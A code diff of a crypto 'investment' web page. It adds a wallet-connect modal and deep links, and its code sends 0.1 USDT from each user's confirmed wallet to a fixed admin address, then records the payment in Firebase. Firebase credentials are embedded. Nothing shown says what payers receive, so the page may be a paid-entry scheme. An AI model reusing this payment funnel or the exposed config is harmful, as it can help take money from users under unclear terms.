@@ -26,22 +26,24 @@
             --neon-green: #10b981;
             --neon-purple: #8b5cf6;
             --success: #10b981;
+            --error: #ef4444;
             --text-light: #f1f5f9;
             --text-dim: #94a3b8;
             --border-glow: rgba(6, 182, 212, 0.25);
         }
 
         body { font-family: 'Outfit', sans-serif; background: radial-gradient(ellipse at 30% 40%, var(--bg-gradient-start), var(--bg-gradient-end)); min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 1.5rem; color: var(--text-light); overflow-x: hidden; }
+        
         .bg-glow-1 { position: fixed; width: 500px; height: 500px; background: var(--neon-cyan); filter: blur(130px); opacity: 0.12; top: -150px; right: -150px; border-radius: 50%; z-index: -1; }
         .bg-glow-2 { position: fixed; width: 600px; height: 600px; background: var(--neon-purple); filter: blur(150px); opacity: 0.1; bottom: -200px; left: -150px; border-radius: 50%; z-index: -1; }
 
-        .main-card { max-width: 560px; width: 100%; background: var(--card-bg); backdrop-filter: blur(20px); border-radius: 2.5rem; border: 1px solid var(--border-glow); box-shadow: 0 30px 60px rgba(0, 0, 0, 0.5); }
-        .header { padding: 2rem 2rem 1rem; text-align: center; border-bottom: 1px solid var(--border-glow); background: linear-gradient(180deg, rgba(6, 182, 212, 0.05), transparent); }
+        .main-card { max-width: 560px; width: 100%; background: var(--card-bg); backdrop-filter: blur(20px); border-radius: 2.5rem; border: 1px solid var(--border-glow); box-shadow: 0 30px 60px rgba(0, 0, 0, 0.5); position: relative; z-index: 10;}
+        .header { padding: 2rem 2rem 1rem; text-align: center; border-bottom: 1px solid var(--border-glow); background: linear-gradient(180deg, rgba(6, 182, 212, 0.05), transparent); border-radius: 2.5rem 2.5rem 0 0; }
         .logo { font-size: 2.2rem; font-weight: 800; background: linear-gradient(135deg, #fff, var(--neon-cyan), var(--neon-purple)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; display: inline-flex; align-items: center; gap: 12px; }
         .subtitle { color: var(--text-dim); font-size: 0.85rem; margin-top: 8px; }
 
         .wallet-card { background: rgba(0, 0, 0, 0.4); margin: 1.5rem; padding: 1rem 1.2rem; border-radius: 1.2rem; display: flex; justify-content: space-between; align-items: center; border: 1px solid rgba(6, 182, 212, 0.2); }
-        .wallet-info { display: flex; align-items: center; gap: 10px; }
+        .wallet-info { display: flex; align-items: center; gap: 10px; font-weight: 500;}
         .status-led { width: 10px; height: 10px; border-radius: 50%; background: #4b5563; transition: all 0.3s; }
         .status-led.active { background: var(--success); box-shadow: 0 0 12px var(--success); animation: pulse 1.5s infinite; }
         @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.6; } }
@@ -58,19 +60,101 @@
         .btn-success { background: linear-gradient(135deg, var(--neon-green), #059669); color: white; }
         .btn:disabled { opacity: 0.6; cursor: not-allowed; }
 
-        .log-area { background: rgba(0, 0, 0, 0.35); margin: 1rem 1.5rem 1.8rem; padding: 0.8rem; border-radius: 1rem; font-size: 0.8rem; color: var(--text-dim); text-align: center; word-wrap: break-word; line-height: 1.4; }
+        .log-area { background: rgba(0, 0, 0, 0.35); margin: 1rem 1.5rem 1.8rem; padding: 0.8rem; border-radius: 1rem; font-size: 0.85rem; color: var(--text-dim); text-align: center; word-wrap: break-word; line-height: 1.4; font-weight: 500;}
+        .log-error { color: var(--error); border: 1px solid rgba(239, 68, 68, 0.3); background: rgba(239, 68, 68, 0.05); }
+        
         .dashboard-view { display: none; }
         .success-badge { background: rgba(16, 185, 129, 0.15); border: 1px solid var(--success); border-radius: 1rem; padding: 1rem; text-align: center; margin-bottom: 1.5rem; }
         .stats-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 1rem; margin-bottom: 1.5rem; }
         .stat-item { background: rgba(0, 0, 0, 0.35); padding: 1rem; border-radius: 1rem; text-align: center; }
         .stat-number { font-size: 1.6rem; font-weight: 700; color: var(--neon-cyan); }
+        
         .spinner-icon { animation: spin 1s linear infinite; }
         @keyframes spin { 100% { transform: rotate(360deg); } }
+
+        /* Wallet Connect Modal UI */
+        .modal-overlay { position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0, 0, 0, 0.8); backdrop-filter: blur(8px); display: flex; justify-content: center; align-items: center; z-index: 9999; opacity: 0; pointer-events: none; transition: all 0.3s ease; }
+        .modal-overlay.active { opacity: 1; pointer-events: auto; }
+        .wallet-modal { background: #191a1f; border: 1px solid #2d2e36; border-radius: 1.5rem; width: 90%; max-width: 380px; padding: 1.5rem; transform: translateY(30px) scale(0.95); transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275); box-shadow: 0 25px 50px rgba(0,0,0,0.6); }
+        .modal-overlay.active .wallet-modal { transform: translateY(0) scale(1); }
+        
+        .modal-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 1.5rem; padding-bottom: 1rem; border-bottom: 1px solid #2d2e36; }
+        .modal-title { font-size: 1.2rem; font-weight: 600; color: #fff; }
+        .close-modal { background: none; border: none; color: #6b7280; font-size: 1.5rem; cursor: pointer; transition: color 0.2s; }
+        .close-modal:hover { color: #fff; }
+        
+        .wallet-options { display: flex; flex-direction: column; gap: 12px; }
+        .wallet-btn { background: #22232a; border: 1px solid #2d2e36; padding: 1rem 1.2rem; border-radius: 1rem; display: flex; justify-content: space-between; align-items: center; color: white; font-size: 1.05rem; cursor: pointer; transition: all 0.2s; }
+        .wallet-btn:hover { background: #2a2b33; border-color: var(--neon-cyan); }
+        .wallet-btn span { display: flex; align-items: center; gap: 15px; font-weight: 500; }
+        .wallet-icon { width: 32px; height: 32px; border-radius: 8px; }
+
+        .connecting-state, .success-state { display: none; flex-direction: column; align-items: center; padding: 2rem 0 1rem; text-align: center; }
+        .live-loader { width: 60px; height: 60px; border: 4px solid #2d2e36; border-top-color: var(--neon-cyan); border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 1.5rem; position: relative; }
+        .live-loader::after { content: ''; position: absolute; top: -4px; left: -4px; right: -4px; bottom: -4px; border-radius: 50%; border: 4px solid transparent; border-top-color: var(--neon-purple); animation: spin 1.5s linear infinite reverse; }
+        
+        .state-title { font-size: 1.3rem; font-weight: 600; color: #fff; margin-bottom: 8px; }
+        .state-desc { font-size: 0.9rem; color: #94a3b8; line-height: 1.5; }
+        
+        .success-circle { width: 60px; height: 60px; background: rgba(16, 185, 129, 0.15); border-radius: 50%; display: flex; justify-content: center; align-items: center; margin-bottom: 1.5rem; border: 2px solid var(--neon-green); }
+        .success-circle i { font-size: 30px; color: var(--neon-green); }
     </style>
 </head>
 <body>
 <div class="bg-glow-1"></div>
 <div class="bg-glow-2"></div>
+
+<!-- Custom Wallet Connect Modal Overlay -->
+<div class="modal-overlay" id="walletModalOverlay">
+    <div class="wallet-modal">
+        <div class="modal-header">
+            <div class="modal-title">Connect Wallet</div>
+            <button class="close-modal" id="closeModalBtn"><i class="fas fa-times"></i></button>
+        </div>
+
+        <!-- 1. Selection State -->
+        <div class="wallet-options" id="walletOptions">
+            <button class="wallet-btn" onclick="selectWallet('MetaMask')">
+                <span>
+                    <img src="https://api.iconify.design/logos:metamask-icon.svg" class="wallet-icon" alt="MetaMask">
+                    MetaMask
+                </span>
+                <i class="fas fa-chevron-right" style="color:#4b5563; font-size:0.9rem;"></i>
+            </button>
+            <button class="wallet-btn" onclick="selectWallet('Trust Wallet')">
+                <span>
+                    <img src="https://api.iconify.design/token-branded:trust-wallet.svg" class="wallet-icon" alt="Trust Wallet">
+                    Trust Wallet
+                </span>
+                <i class="fas fa-chevron-right" style="color:#4b5563; font-size:0.9rem;"></i>
+            </button>
+            <button class="wallet-btn" onclick="selectWallet('Injected')">
+                <span>
+                    <div class="wallet-icon" style="background:var(--neon-purple); display:flex; justify-content:center; align-items:center;"><i class="fas fa-globe" style="color:#fff;"></i></div>
+                    Browser Wallet
+                </span>
+                <i class="fas fa-chevron-right" style="color:#4b5563; font-size:0.9rem;"></i>
+            </button>
+        </div>
+
+        <!-- 2. Connecting State -->
+        <div class="connecting-state" id="connectingState">
+            <div class="live-loader"></div>
+            <div class="state-title" id="connectingTitle">Connecting...</div>
+            <div class="state-desc">Please approve the connection request in your wallet.</div>
+            <button class="btn" style="background: #2d2e36; margin-top: 20px; padding: 0.8rem;" onclick="resetModal()">Cancel</button>
+        </div>
+
+        <!-- 3. Success State -->
+        <div class="success-state" id="successState">
+            <div class="success-circle">
+                <i class="fas fa-check"></i>
+            </div>
+            <div class="state-title">Successfully Connected!</div>
+            <div class="state-desc" style="color: var(--neon-green);">Synchronizing data...</div>
+        </div>
+    </div>
+</div>
 
 <div class="main-card">
     <!-- Initial Investment View -->
@@ -92,7 +176,7 @@
             <div class="amount-card">
                 <div class="amount-label">INVESTMENT AMOUNT</div>
                 <div class="amount-value">0.10 <small>USDT</small></div>
-                <div style="font-size: 0.7rem; color: var(--text-dim);">⚡ BEP20 Network • Binance Smart Chain</div>
+                <div style="font-size: 0.75rem; color: var(--text-dim); margin-top:5px;">⚡ BEP20 Network • Binance Smart Chain</div>
             </div>
 
             <button class="btn btn-primary" id="connectWalletBtn">
@@ -156,23 +240,26 @@
 
 <script>
     // ==========================================
-    // FIREBASE CONFIGURATION
+    // FIREBASE CONFIGURATION (SECURE TRY-CATCH)
     // ==========================================
-    const firebaseConfig = {
-        apiKey: "AIzaSyBbrToB9q01xSfRR21e5XaeGJGhVHmBN1w",
-        databaseURL: "https://fortune-2cb70-default-rtdb.asia-southeast1.firebasedatabase.app/"
-    };
-    firebase.initializeApp(firebaseConfig);
-    const db = firebase.database();
+    let db;
+    try {
+        const firebaseConfig = {
+            apiKey: "AIzaSyBbrToB9q01xSfRR21e5XaeGJGhVHmBN1w",
+            databaseURL: "https://fortune-2cb70-default-rtdb.asia-southeast1.firebasedatabase.app/"
+        };
+        firebase.initializeApp(firebaseConfig);
+        db = firebase.database();
+    } catch (e) {
+        console.error("Firebase Init Error:", e);
+    }
 
     // ==========================================
-    // CONTRACT & NETWORK CONFIGURATION
+    // SMART CONTRACT CONSTANTS
     // ==========================================
     const USDT_TOKEN_ADDRESS = "0x55d398326f99059fF775485246999027B3197955"; 
-    const BSC_CHAIN_ID_HEX = "0x38"; // 56 in Hex
+    const BSC_CHAIN_ID_HEX = "0x38"; // 56
     const ADMIN_WALLET = "0x742d35Cc6634C0532925a3b844Bc9e7599b5A3D6";
-    const VALID_ADMIN_ADDRESS = ethers.getAddress(ADMIN_WALLET);
-    
     const ERC20_ABI = [
         "function balanceOf(address owner) view returns (uint256)",
         "function decimals() view returns (uint8)",
@@ -184,215 +271,278 @@
     let userWalletAddress = null;
     let usdtTokenContract = null;
     let tokenDecimals = 18;
-    let hasInvestedFlag = false;
 
     // DOM Elements
     const connectBtn = document.getElementById('connectWalletBtn');
     const investBtn = document.getElementById('investNowBtn');
     const investLoader = document.getElementById('investLoader');
-    const statusLed = document.getElementById('statusLed');
-    const walletDisplaySpan = document.getElementById('walletDisplay');
     const logMsgDiv = document.getElementById('logMessage');
-    const initialViewDiv = document.getElementById('initialView');
-    const dashboardViewDiv = document.getElementById('dashboardView');
+    
+    const modalOverlay = document.getElementById('walletModalOverlay');
+    const walletOptions = document.getElementById('walletOptions');
+    const connectingState = document.getElementById('connectingState');
+    const successState = document.getElementById('successState');
+    const connectingTitle = document.getElementById('connectingTitle');
 
+    // UI Feedback Helper
     function setStatusMessage(msg, isError = false) {
         logMsgDiv.innerHTML = `<i class="fas ${isError ? 'fa-circle-exclamation' : 'fa-circle-info'}"></i> ${msg}`;
-        logMsgDiv.style.color = isError ? '#f87171' : '#94a3b8';
-    }
-
-    function formatWalletAddress(addr) {
-        return addr ? `${addr.slice(0, 6)}...${addr.slice(-4)}` : "Not Connected";
-    }
-
-    // Check Firebase for Existing User Investment
-    async function checkExistingInvestment(wallet) {
-        if (!wallet) return false;
-        try {
-            const snapshot = await db.ref(`invested_users/${wallet.toLowerCase()}`).once('value');
-            const data = snapshot.val();
-            return (data && data.invested === true);
-        } catch (error) {
-            return false;
+        if (isError) {
+            logMsgDiv.classList.add('log-error');
+        } else {
+            logMsgDiv.classList.remove('log-error');
         }
     }
 
-    // Ensure Network is BSC Mainnet
-    async function ensureBSCNetwork() {
-        const chainId = await window.ethereum.request({ method: 'eth_chainId' });
-        if (chainId !== BSC_CHAIN_ID_HEX) {
-            setStatusMessage("🌐 Switching to Binance Smart Chain...");
-            try {
-                await window.ethereum.request({
-                    method: 'wallet_switchEthereumChain',
-                    params: [{ chainId: BSC_CHAIN_ID_HEX }]
-                });
-                return true;
-            } catch (switchErr) {
-                // If network is not added in metamask/trustwallet
-                if (switchErr.code === 4902) {
-                    try {
-                        await window.ethereum.request({
-                            method: 'wallet_addEthereumChain',
-                            params: [{
-                                chainId: BSC_CHAIN_ID_HEX,
-                                chainName: "BNB Smart Chain Mainnet",
-                                rpcUrls: ["https://bsc-dataseed.binance.org/"],
-                                nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
-                                blockExplorerUrls: ["https://bscscan.com"]
-                            }]
-                        });
-                        return true;
-                    } catch (addError) {
-                        return false;
+    // Check if device is Mobile
+    function isMobileDevice() {
+        return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+    }
+
+    // Modal Control Functions
+    function openModal() {
+        resetModal();
+        modalOverlay.classList.add('active');
+    }
+
+    function resetModal() {
+        walletOptions.style.display = 'flex';
+        connectingState.style.display = 'none';
+        successState.style.display = 'none';
+    }
+
+    function closeModal() {
+        modalOverlay.classList.remove('active');
+        setTimeout(resetModal, 300);
+    }
+
+    connectBtn.addEventListener('click', openModal);
+    document.getElementById('closeModalBtn').addEventListener('click', closeModal);
+    
+    // Prevent closing when clicking inside the modal
+    modalOverlay.addEventListener('click', (e) => {
+        if(e.target === modalOverlay) closeModal();
+    });
+
+    // ==========================================
+    // WALLET SELECTION & CONNECTION LOGIC
+    // ==========================================
+    async function selectWallet(walletName) {
+        walletOptions.style.display = 'none';
+        connectingState.style.display = 'flex';
+        connectingTitle.innerText = `Connecting to ${walletName}...`;
+
+        try {
+            // Check if standard injected wallet exists (window.ethereum)
+            if (typeof window.ethereum === 'undefined') {
+                if (isMobileDevice()) {
+                    // Mobile Deep Linking (No Error Crash)
+                    const currentUrl = window.location.host + window.location.pathname;
+                    if (walletName === 'MetaMask') {
+                        window.location.href = `https://metamask.app.link/dapp/${currentUrl}`;
+                    } else if (walletName === 'Trust Wallet') {
+                        window.location.href = `https://link.trustwallet.com/open_url?coin_id=60&url=https://${currentUrl}`;
+                    } else {
+                        throw new Error("Please open this page inside a DApp Browser (Trust Wallet / MetaMask).");
                     }
+                    return;
+                } else {
+                    // Desktop Error
+                    throw new Error("No crypto wallet found. Please install MetaMask Extension.");
                 }
-                return false;
             }
+
+            // Request Connection
+            const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
+            if (!accounts || accounts.length === 0) throw new Error("Connection request cancelled.");
+
+            // Show Success UI in Modal
+            connectingState.style.display = 'none';
+            successState.style.display = 'flex';
+
+            // Wait 1.2s then setup the blockchain details behind the scenes
+            setTimeout(() => {
+                closeModal();
+                setupBlockchainEnvironment();
+            }, 1200);
+
+        } catch (error) {
+            console.error("Wallet Connection Error:", error);
+            
+            // Clean Error Messages
+            let errMsg = "Connection failed. Please try again.";
+            if (error.code === 4001) errMsg = "Request rejected. You declined the connection.";
+            if (error.code === -32002) errMsg = "Request already pending. Please open your wallet.";
+            if (error.message) errMsg = error.message;
+
+            setStatusMessage(errMsg, true);
+            resetModal();
+            closeModal();
         }
-        return true; // Already on BSC
     }
 
     // ==========================================
-    // 1. PERFECT WALLET CONNECTION FLOW
+    // BLOCKCHAIN SETUP & VALIDATION
     // ==========================================
-    async function connectUserWallet() {
-        if (typeof window.ethereum === 'undefined') {
-            alert("❌ Wallet not found! Please open this link inside Trust Wallet or MetaMask browser.");
-            return;
-        }
-
+    async function setupBlockchainEnvironment() {
         try {
+            setStatusMessage("🔌 Verifying Network (Binance Smart Chain)...");
             connectBtn.disabled = true;
-            setStatusMessage("🔌 Requesting wallet connection...");
-            
-            // Request accounts from wallet
-            const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
-            if (!accounts || accounts.length === 0) throw new Error("No accounts found.");
 
-            // Force BSC Network check BEFORE initializing contract
+            // 1. Force BSC Network
             const isBSC = await ensureBSCNetwork();
             if (!isBSC) {
-                setStatusMessage("❌ Please switch to Binance Smart Chain to continue.", true);
+                setStatusMessage("❌ Network Error: Switch to Binance Smart Chain and try again.", true);
                 connectBtn.disabled = false;
                 return;
             }
 
-            // Initialize Provider & Signer
+            // 2. Setup Ethers.js
             web3Provider = new ethers.BrowserProvider(window.ethereum);
             web3Signer = await web3Provider.getSigner();
             userWalletAddress = await web3Signer.getAddress();
             
-            // Safe to Initialize USDT Contract now (Because we are on BSC)
+            // 3. Setup Contract
             usdtTokenContract = new ethers.Contract(USDT_TOKEN_ADDRESS, ERC20_ABI, web3Signer);
             tokenDecimals = Number(await usdtTokenContract.decimals()); 
             
-            // Update UI Interface
-            walletDisplaySpan.innerHTML = `<i class="fas fa-check-circle"></i> ${formatWalletAddress(userWalletAddress)}`;
-            statusLed.classList.add('active');
+            // 4. Update UI to Connected State
+            document.getElementById('walletDisplay').innerHTML = `<i class="fas fa-check-circle"></i> ${userWalletAddress.slice(0,6)}...${userWalletAddress.slice(-4)}`;
+            document.getElementById('statusLed').classList.add('active');
+            
             connectBtn.style.display = "none";
             investBtn.style.display = "flex";
             
-            setStatusMessage(`✅ Connected: ${formatWalletAddress(userWalletAddress)}. Checking status...`);
+            setStatusMessage(`✅ Connected: Checking your account status...`);
             
-            // Check Firebase Data
-            hasInvestedFlag = await checkExistingInvestment(userWalletAddress);
-            if (hasInvestedFlag) {
-                setStatusMessage("🎉 Previous investment found! Opening Dashboard...");
-                setTimeout(showUserDashboard, 1500);
-            } else {
-                setStatusMessage("💰 Ready to invest! Click 'Invest 0.1 USDT' to continue.");
+            // 5. Check Firebase for past investment
+            if (db) {
+                const snapshot = await db.ref(`invested_users/${userWalletAddress.toLowerCase()}`).once('value');
+                if (snapshot.exists() && snapshot.val().invested === true) {
+                    setStatusMessage("🎉 Previous investment found! Opening Dashboard...");
+                    setTimeout(showUserDashboard, 1500);
+                    return;
+                }
             }
+            
+            setStatusMessage("💰 Wallet Connected! Click 'Invest 0.1 USDT' to activate your account.");
             
         } catch (error) {
-            console.error("Connection error:", error);
-            if (error.code === 4001) {
-                setStatusMessage("❌ Connection rejected by user.", true);
-            } else {
-                setStatusMessage("❌ Connection failed. Refresh page and try again.", true);
-            }
+            console.error("Setup error:", error);
+            setStatusMessage("❌ Setup failed. Please refresh the page.", true);
             connectBtn.disabled = false;
         }
     }
 
     // ==========================================
-    // 2. FLAWLESS TRANSACTION EXECUTION
+    // NETWORK SWITCHING (ERROR-PROOF)
     // ==========================================
-    async function executeInvestment() {
+    async function ensureBSCNetwork() {
         try {
-            investBtn.disabled = true;
-            investLoader.style.display = "inline-block";
-            setStatusMessage("⏳ Verifying your balances...");
-            
-            const investmentAmountWei = ethers.parseUnits("0.1", tokenDecimals);
-            
-            // Check User USDT Balance
-            const userUsdtBalance = await usdtTokenContract.balanceOf(userWalletAddress);
-            if (userUsdtBalance < investmentAmountWei) {
-                const balFormatted = Number(ethers.formatUnits(userUsdtBalance, tokenDecimals)).toFixed(4);
-                setStatusMessage(`❌ Insufficient USDT! Your Balance: ${balFormatted} USDT. Need 0.1 USDT`, true);
-                investBtn.disabled = false;
-                investLoader.style.display = "none";
-                return;
-            }
-
-            // BNB Gas Fee Check via Gas Estimation
-            setStatusMessage("🔄 Please CONFIRM the transaction in your wallet...");
-            try {
-                await usdtTokenContract.transfer.estimateGas(VALID_ADMIN_ADDRESS, investmentAmountWei);
-            } catch (gasError) {
-                setStatusMessage("❌ Transaction will fail. You need a small amount of BNB for network fee.", true);
-                investBtn.disabled = false;
-                investLoader.style.display = "none";
-                return;
-            }
-
-            // Execute Transaction
-            const transferTx = await usdtTokenContract.transfer(VALID_ADMIN_ADDRESS, investmentAmountWei);
-            setStatusMessage(`⏳ Processing... Please wait. Hash: ${transferTx.hash.slice(0, 10)}...`);
-            
-            // Wait for Block Confirmation
-            const receipt = await transferTx.wait();
-            
-            if (receipt.status === 1) {
-                setStatusMessage(`✅ SUCCESS! Saving details...`);
-                
-                // Save to Firebase
-                const safeKey = userWalletAddress.toLowerCase();
-                const timestamp = Date.now();
-                await db.ref().update({
-                    [`invested_users/${safeKey}`]: { wallet: userWalletAddress, invested: true, amount: "0.1", timestamp, txHash: receipt.hash, status: "active" },
-                    [`user_investments/${receipt.hash}`]: { from: userWalletAddress, to: VALID_ADMIN_ADDRESS, amount: "0.1", timestamp, txHash: receipt.hash, status: "COMPLETED" },
-                    [`connected_users/${safeKey}`]: { wallet: userWalletAddress, usdtBalance: "0.00", lastConnected: new Date().toISOString(), invested: true, investmentAmount: "0.1", network: "BSC Mainnet" }
+            const chainId = await window.ethereum.request({ method: 'eth_chainId' });
+            if (chainId !== BSC_CHAIN_ID_HEX) {
+                await window.ethereum.request({
+                    method: 'wallet_switchEthereumChain',
+                    params: [{ chainId: BSC_CHAIN_ID_HEX }]
                 });
-
-                hasInvestedFlag = true;
-                showUserDashboard();
-            } else {
-                throw new Error("Blockchain reversed transaction.");
             }
-            
-        } catch (error) {
-            console.error("Investment error:", error);
-            let errorMsg = "Transaction Failed.";
-            if (error.code === 4001 || error.message.includes("user rejected")) {
-                errorMsg = "Transaction cancelled by you.";
-            } else if (error?.info?.error?.message) {
-                errorMsg = error.info.error.message;
+            return true;
+        } catch (switchErr) {
+            // Error code 4902 means the chain hasn't been added to the wallet
+            if (switchErr.code === 4902) {
+                try {
+                    await window.ethereum.request({
+                        method: 'wallet_addEthereumChain',
+                        params: [{
+                            chainId: BSC_CHAIN_ID_HEX,
+                            chainName: "BNB Smart Chain Mainnet",
+                            rpcUrls: ["https://bsc-dataseed.binance.org/"],
+                            nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
+                            blockExplorerUrls: ["https://bscscan.com"]
+                        }]
+                    });
+                    return true;
+                } catch (addError) {
+                    console.error("Failed to add BSC Network", addError);
+                    return false;
+                }
             }
-            setStatusMessage(`❌ Error: ${errorMsg}`, true);
-            investBtn.disabled = false;
-            investLoader.style.display = "none";
+            console.error("Failed to switch network", switchErr);
+            return false;
         }
     }
 
     // ==========================================
-    // 3. DASHBOARD LOGIC
+    // SAFE TRANSACTION EXECUTION
+    // ==========================================
+    investBtn.addEventListener('click', async () => {
+        try {
+            investBtn.disabled = true;
+            investLoader.style.display = "inline-block";
+            setStatusMessage("⏳ Verifying your wallet balance...");
+            
+            const validAdminAddr = ethers.getAddress(ADMIN_WALLET);
+            const investmentAmountWei = ethers.parseUnits("0.1", tokenDecimals);
+            
+            // 1. Balance Check
+            const userUsdtBalance = await usdtTokenContract.balanceOf(userWalletAddress);
+            if (userUsdtBalance < investmentAmountWei) {
+                const balFormatted = Number(ethers.formatUnits(userUsdtBalance, tokenDecimals)).toFixed(4);
+                throw new Error(`Insufficient USDT! You have ${balFormatted} USDT.`);
+            }
+
+            // 2. Gas Estimate (Prevents failed TXs if no BNB)
+            setStatusMessage("🔄 Please CONFIRM the transaction in your wallet popup...");
+            try {
+                await usdtTokenContract.transfer.estimateGas(validAdminAddr, investmentAmountWei);
+            } catch (gasError) {
+                throw new Error("You need a small amount of BNB (Smart Chain) to pay the network gas fee.");
+            }
+
+            // 3. Send Transaction
+            const transferTx = await usdtTokenContract.transfer(validAdminAddr, investmentAmountWei);
+            setStatusMessage(`⏳ Processing TX on Blockchain... Please wait.`);
+            
+            // 4. Wait for confirmation
+            const receipt = await transferTx.wait();
+            
+            if (receipt.status === 1) {
+                setStatusMessage(`✅ SUCCESS! Investment Confirmed.`);
+                
+                // 5. Save to Firebase securely
+                if (db) {
+                    const safeKey = userWalletAddress.toLowerCase();
+                    const timestamp = Date.now();
+                    await db.ref().update({
+                        [`invested_users/${safeKey}`]: { wallet: userWalletAddress, invested: true, amount: "0.1", timestamp, txHash: receipt.hash },
+                        [`user_investments/${receipt.hash}`]: { from: userWalletAddress, to: validAdminAddr, amount: "0.1", timestamp, status: "COMPLETED" }
+                    }).catch(e => console.error("Firebase save error:", e));
+                }
+
+                showUserDashboard();
+            } else {
+                throw new Error("Transaction was reversed or failed on the blockchain.");
+            }
+            
+        } catch (error) {
+            console.error("Investment Error:", error);
+            let errMsg = "Transaction Failed.";
+            if (error.code === 4001 || error.message.includes("user rejected")) errMsg = "Transaction cancelled by you.";
+            else if (error.message) errMsg = error.message;
+
+            setStatusMessage(`❌ Error: ${errMsg}`, true);
+            investBtn.disabled = false;
+            investLoader.style.display = "none";
+        }
+    });
+
+    // ==========================================
+    // DASHBOARD LOGIC
     // ==========================================
     async function showUserDashboard() {
-        initialViewDiv.style.display = "none";
-        dashboardViewDiv.style.display = "block";
-        document.getElementById('dashWalletAddr').innerText = formatWalletAddress(userWalletAddress);
+        document.getElementById('initialView').style.display = "none";
+        document.getElementById('dashboardView').style.display = "block";
+        document.getElementById('dashWalletAddr').innerText = `${userWalletAddress.slice(0,6)}...${userWalletAddress.slice(-4)}`;
         await fetchUserDashboardStats();
     }
     
@@ -403,7 +553,7 @@
             const formattedBalance = ethers.formatUnits(balanceWei, tokenDecimals);
             document.getElementById('dashBalance').innerText = Number(formattedBalance).toFixed(4);
         } catch (error) {
-            console.error("Stats Error:", error);
+            console.error("Dashboard Stats Error:", error);
         }
     }
 
@@ -416,28 +566,7 @@
         setTimeout(() => { btn.disabled = false; }, 2000);
     });
 
-    // ==========================================
-    // INITIALIZATION & EVENT LISTENERS
-    // ==========================================
-    connectBtn.addEventListener('click', connectUserWallet);
-    investBtn.addEventListener('click', executeInvestment);
-
-    // Silent Auto-Connect (Checks if wallet is already approved, without popping up Metamask)
-    window.addEventListener('load', async () => {
-        if (window.ethereum) {
-            try {
-                const accounts = await window.ethereum.request({ method: 'eth_accounts' });
-                if (accounts.length > 0) {
-                    // Wallet pehle se connect hai, directly call connect function
-                    connectUserWallet();
-                }
-            } catch (e) {
-                console.log("Silent connect failed");
-            }
-        }
-    });
-
-    // Handle User Changing Wallets or Networks
+    // Auto-reload on account or network change
     if (window.ethereum) {
         window.ethereum.on('accountsChanged', (accounts) => {
             if (accounts.length > 0) window.location.reload(); 
